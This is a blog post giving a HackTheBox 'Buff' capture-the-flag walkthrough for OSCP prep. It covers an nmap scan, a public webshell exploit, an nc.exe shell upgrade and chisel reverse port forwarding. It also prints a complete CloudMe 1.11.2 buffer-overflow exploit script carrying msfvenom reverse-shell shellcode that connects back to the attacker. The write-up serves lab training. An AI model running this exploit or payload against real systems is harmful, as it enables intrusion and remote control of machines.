<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox - Buff" /><meta property="og:locale" content="en" /><meta name="description" content="Buff is a very nice OSCP style box, where I have to identify the web software running on the site, and exploit it using public exploits to get execution via webshell. For privesc, I’ll find another service I can exploit using public exploits. I’m going to build with my own shell code to create my own shell, and set up the service so that I can connect just by listening on localhost. From there, the exploit script returns an administrator’s shell. In Beyond Root, I’ll go through the first script and do the exploit manually, and see how Defender blocks some of my attempts" /><meta property="og:description" content="Buff is a very nice OSCP style box, where I have to identify the web software running on the site, and exploit it using public exploits to get execution via webshell. For privesc, I’ll find another service I can exploit using public exploits. I’m going to build with my own shell code to create my own shell, and set up the service so that I can connect just by listening on localhost. From there, the exploit script returns an administrator’s shell. In Beyond Root, I’ll go through the first script and do the exploit manually, and see how Defender blocks some of my attempts" /><link rel="canonical" href="https://0x.3n0.us/htb-buff/" /><meta property="og:url" content="https://0x.3n0.us/htb-buff/" /><meta property="og:site_name" content="0x3n0" /><meta property="og:image" content="https://0x.3n0.us/assets/img/htb/machines/windows/easy/buff/Buff.jpeg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-18T06:49:17+07:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0x.3n0.us/assets/img/htb/machines/windows/easy/buff/Buff.jpeg" /><meta property="twitter:title" content="HackTheBox - Buff" /><meta name="twitter:site" content="@0x3n0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-07T15:22:31+07:00","datePublished":"2021-10-18T06:49:17+07:00","description":"Buff is a very nice OSCP style box, where I have to identify the web software running on the site, and exploit it using public exploits to get execution via webshell. For privesc, I’ll find another service I can exploit using public exploits. I’m going to build with my own shell code to create my own shell, and set up the service so that I can connect just by listening on localhost. From there, the exploit script returns an administrator’s shell. In Beyond Root, I’ll go through the first script and do the exploit manually, and see how Defender blocks some of my attempts","headline":"HackTheBox - Buff","image":"https://0x.3n0.us/assets/img/htb/machines/windows/easy/buff/Buff.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"https://0x.3n0.us/htb-buff/"},"url":"https://0x.3n0.us/htb-buff/"}</script> <script src="//darksec.or.id/comments/dist/Valine.min.js"></script><title>HackTheBox - Buff | 0x3n0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0x3n0"><meta name="application-name" content="0x3n0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0x3n0</a></div><div class="site-subtitle font-italic">Researcher | Pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/Whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a><li class="nav-item"> <a href="/revershell/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>REVERSHELL</span> </a><li class="nav-item"> <a href="/OSINT/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>OSINT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/0x3n0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/0x3n0" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://instagram.com/0x3n0" aria-label="instagram" target="_blank" rel="noopener"> <i class="fab fa-instagram"></i> </a> <a href="https://app.hackthebox.com/profile/381523" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Buff</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Buff</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 0x3n0 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 18, 2021, 6:49 AM +0700" >Oct 18, 2021<i class="unloaded">2021-10-18T06:49:17+07:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 7, 2022, 5:22 PM +0900" >Jan 7<i class="unloaded">2022-01-07T15:22:31+07:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="848 words">4 min read</span></div></div><div class="post-content"><p>Buff is a very nice OSCP style box, where I have to identify the web software running on the site, and exploit it using public exploits to get execution via webshell. For privesc, I’ll find another service I can exploit using public exploits. I’m going to build with my own shell code to create my own shell, and set up the service so that I can connect just by listening on localhost. From there, the exploit script returns an administrator’s shell. In Beyond Root, I’ll go through the first script and do the exploit manually, and see how Defender blocks some of my attempts</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan"><code class="language-plaintext highlighter-rouge">nmap</code> scan</h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-min-rate</span> 5000 <span class="nt">--max-retries</span> 1 <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oN</span> Buff-full-port-scan.txt 10.10.10.198
Nmap scan report <span class="k">for </span>10.10.10.198
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6<span class="o">)</span>
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n<span class="s1">'s Bro Hut
</span></pre></table></code></div></div><h3 id="port-8080-http">Port 8080 (HTTP)</h3><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/8080.png" alt="Desktop View" /></p><p>Visiting port 8080 shows us a web page about fitness.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/contact.png" alt="Desktop View" /></p><p>The <code class="language-plaintext highlighter-rouge">/contact.php</code> page discloses that Gym Management Software is being used.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/searchsploit.png" alt="Desktop View" /></p><p>Using <code class="language-plaintext highlighter-rouge">searchsploit</code> we identified a potential exploit.</p><h2 id="foothold">Foothold</h2><p>The exploit mimics a shell and allows us to send remote command.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/exploit.png" alt="Desktop View" /></p><p>We can upgrade our shell to a more stable shell by uploading <code class="language-plaintext highlighter-rouge">nc.exe</code> and executing it:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$ </span>locate nc.exe
/opt/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-resources/binaries/nc.exe
<span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-resources/binaries/nc.exe <span class="nb">.</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/more_stable_shell.png" alt="Desktop View" /></p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/nc.png" alt="Desktop View" /></p><h2 id="privesc">Privesc</h2><p>Using <code class="language-plaintext highlighter-rouge">winPEAS</code> we can see that there is an app called <code class="language-plaintext highlighter-rouge">CloudMe</code> which is running on local port <strong>8888</strong> but is not running on remote port.</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/cloudme_tcp.png" alt="Desktop View" /></p><p>Plus, if we look at <code class="language-plaintext highlighter-rouge">C:\Users\shaun\Downloads\</code>, we can find a binary file called <code class="language-plaintext highlighter-rouge">CloudMe_1112.exe</code>:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\shaun\Downloads</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
</span><span class="n">dir</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\shaun\Downloads</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                  
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">16</span><span class="n">/06/2020</span><span class="w">     </span><span class="nx">16:26</span><span class="w">       </span><span class="nx">17830824</span><span class="w"> </span><span class="nx">CloudMe_1112.exe</span><span class="w">  
</span></pre></table></code></div></div><p>In order to transfer it to our local machine, we can take advantage of the current web server:</p><pre><code class="language-cmd">C:\Users\shaun\Downloads&gt;copy CloudMe_1112.exe C:\xampp\htdocs\gym\                                                                                 
copy CloudMe_1112.exe C:\xampp\htdocs\gym\
        1 file(s) copied.
</code></pre><blockquote><p><strong>Note</strong>: following <a href="https://academy.hackthebox.eu/course/preview/stack-based-buffer-overflows-on-windows-x86"><strong>Stack-Based Buffer Overflows on Windows x86</strong> course on Academy</a> will guide you on writing an exploit for this program.</p></blockquote><h3 id="port-forwarding-with-chisel">Port forwarding with <code class="language-plaintext highlighter-rouge">chisel</code></h3><p><code class="language-plaintext highlighter-rouge">CloudMe</code> is listening only on localhost.</p><p>If we want to make this port available to our machine, we can use a <strong>SOCKS proxy</strong> such as <code class="language-plaintext highlighter-rouge">Chisel</code>. Go to the <a href="https://github.com/jpillora/chisel/releases">release page</a> and download the last executables for windows and linux amd64.</p><ul><li><p>First, on our Kali machine, we have to set up the Chisel server, listening on any port (here 9999):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>  <span class="nv">$ </span>/chisel_1.7.6_linux_amd64 server <span class="nt">-p</span> 9999 <span class="nt">--reverse</span>
  2021/09/07 00:09:35 server: Reverse tunnelling enabled
  2021/09/07 00:09:35 server: Fingerprint <span class="nv">EFwUZIpNMK9gCrrI3aubBlSlDShKhEzk0ophq0C08S4</span><span class="o">=</span>
  2021/09/07 00:09:35 server: Listening on http://0.0.0.0:9999
</pre></table></code></div></div><li><p>Then, on the target machine, tunel the port 8888 to our machine:</p><pre><code class="language-cmd">  C:\&gt;.\chisel.exe client 10.10.14.12:9999 R:8888:127.0.0.1:8888
  .\chisel.exe client 10.10.14.12:9999 R:8888:127.0.0.1:8888
  2021/09/06 23:17:24 client: Connecting to ws://10.10.14.12:9999
  2021/09/06 23:17:26 client: Connected (Latency 188.0315ms)
</code></pre></ul><h3 id="exploitation">Exploitation</h3><p>Looking for <code class="language-plaintext highlighter-rouge">CloudMe</code> with <code class="language-plaintext highlighter-rouge">searchsploit</code>, we can find multiple exploits:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/cloud_me_exploits.png" alt="Desktop View" /></p><p>The first one will worked just fine but we have to replace the shellcode. <code class="language-plaintext highlighter-rouge">msfvenom</code> can help us to do that:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="si">$(</span>vpnip<span class="si">)</span> <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">0a"</span> <span class="nt">-f</span> python <span class="nt">--var-name</span> payload
</pre></table></code></div></div><p>Then we can edit the exploit source file as follows:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre><span class="c1"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86
</span>
<span class="c1">#Instructions:
# Start the CloudMe service and run the script.
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">target</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>

<span class="n">padding1</span>   <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">1052</span>
<span class="n">EIP</span>        <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xB5\x42\xA8\x68</span><span class="s">"</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET
</span><span class="n">NOPS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">30</span>

<span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=$(vpnip) LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python --var-name payload
</span><span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xb8\x45\x01\x16\x38\xd9\xed\xd9\x74\x24\xf4\x5f</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x33\xc9\xb1\x52\x83\xef\xfc\x31\x47\x0e\x03\x02</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x0f\xf4\xcd\x70\xe7\x7a\x2d\x88\xf8\x1a\xa7\x6d</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc9\x1a\xd3\xe6\x7a\xab\x97\xaa\x76\x40\xf5\x5e</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x0c\x24\xd2\x51\xa5\x83\x04\x5c\x36\xbf\x75\xff</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xb4\xc2\xa9\xdf\x85\x0c\xbc\x1e\xc1\x71\x4d\x72</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x9a\xfe\xe0\x62\xaf\x4b\x39\x09\xe3\x5a\x39\xee</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xb4\x5d\x68\xa1\xcf\x07\xaa\x40\x03\x3c\xe3\x5a</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x40\x79\xbd\xd1\xb2\xf5\x3c\x33\x8b\xf6\x93\x7a</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x23\x05\xed\xbb\x84\xf6\x98\xb5\xf6\x8b\x9a\x02</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x84\x57\x2e\x90\x2e\x13\x88\x7c\xce\xf0\x4f\xf7</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xdc\xbd\x04\x5f\xc1\x40\xc8\xd4\xfd\xc9\xef\x3a</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x74\x89\xcb\x9e\xdc\x49\x75\x87\xb8\x3c\x8a\xd7</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x62\xe0\x2e\x9c\x8f\xf5\x42\xff\xc7\x3a\x6f\xff</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x17\x55\xf8\x8c\x25\xfa\x52\x1a\x06\x73\x7d\xdd</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x69\xae\x39\x71\x94\x51\x3a\x58\x53\x05\x6a\xf2</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x72\x26\xe1\x02\x7a\xf3\xa6\x52\xd4\xac\x06\x02</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x94\x1c\xef\x48\x1b\x42\x0f\x73\xf1\xeb\xba\x8e</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x92\x19\x31\x9e\x6e\x76\x47\x9e\x7f\xda\xce\x78</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x15\xf2\x86\xd3\x82\x6b\x83\xaf\x33\x73\x19\xca</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x74\xff\xae\x2b\x3a\x08\xda\x3f\xab\xf8\x91\x1d</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x7a\x06\x0c\x09\xe0\x95\xcb\xc9\x6f\x86\x43\x9e</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x38\x78\x9a\x4a\xd5\x23\x34\x68\x24\xb5\x7f\x28</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xf3\x06\x81\xb1\x76\x32\xa5\xa1\x4e\xbb\xe1\x95</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x1e\xea\xbf\x43\xd9\x44\x0e\x3d\xb3\x3b\xd8\xa9</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x42\x70\xdb\xaf\x4a\x5d\xad\x4f\xfa\x08\xe8\x70</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x33\xdd\xfc\x09\x29\x7d\x02\xc0\xe9\x9d\xe1\xc0</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x07\x36\xbc\x81\xa5\x5b\x3f\x7c\xe9\x65\xbc\x74</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x92\x91\xdc\xfd\x97\xde\x5a\xee\xe5\x4f\x0f\x10</span><span class="s">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x59\x6f\x1a</span><span class="s">"</span>

<span class="n">overrun</span>    <span class="o">=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>	

<span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span> 

<span class="k">try</span><span class="p">:</span>
	<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">exc_value</span><span class="p">)</span>
</pre></table></code></div></div><p>We forwarded the port 8888 of the target on ou port 8888, now we just have to run the exploit:</p><p><img data-proofer-ignore data-src="/assets/img/htb/machines/windows/easy/buff/flag.png" alt="Desktop View" /></p><hr /><h2 id="useful-links">Useful links</h2><ul><li><a href="https://github.com/jpillora/chisel">Chisel</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox-walkthroughs/'>Hackthebox walkthroughs</a>, <a href='/categories/windows/'>Windows</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/gym-management-system/" class="post-tag no-text-decoration" >Gym Management System</a> <a href="/tags/searchsploit/" class="post-tag no-text-decoration" >searchsploit</a> <a href="/tags/nc-exe/" class="post-tag no-text-decoration" >nc.exe</a> <a href="/tags/port-forwarding/" class="post-tag no-text-decoration" >port forwarding</a> <a href="/tags/chisel/" class="post-tag no-text-decoration" >chisel</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer overflow</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/msfvenom/" class="post-tag no-text-decoration" >msfvenom</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a> <a href="/tags/htb-windows-easy/" class="post-tag no-text-decoration" >htb-windows-easy</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp-prep</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://0x3n0.us"> 0x3n0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Buff - 0x3n0&url=https://0x.3n0.us/htb-buff/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Buff - 0x3n0&u=https://0x.3n0.us/htb-buff/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Buff - 0x3n0&url=https://0x.3n0.us/htb-buff/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://0x.3n0.us/htb-buff/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="http://service.weibo.com/share/share.php?title=HackTheBox - Buff - 0x3n0&url=https://0x.3n0.us/htb-buff/" data-toggle="tooltip" data-placement="top" title="Weibo" target="_blank" rel="noopener" aria-label="Weibo"> <i class="fa-fw fab fa-weibo"></i> </a> <a href="https://lineit.line.me/share/ui?url=https://0x.3n0.us/htb-buff/&text=HackTheBox - Buff - 0x3n0" data-toggle="tooltip" data-placement="top" title="Line" target="_blank" rel="noopener" aria-label="Line"> <i class="fa-fw iconfont 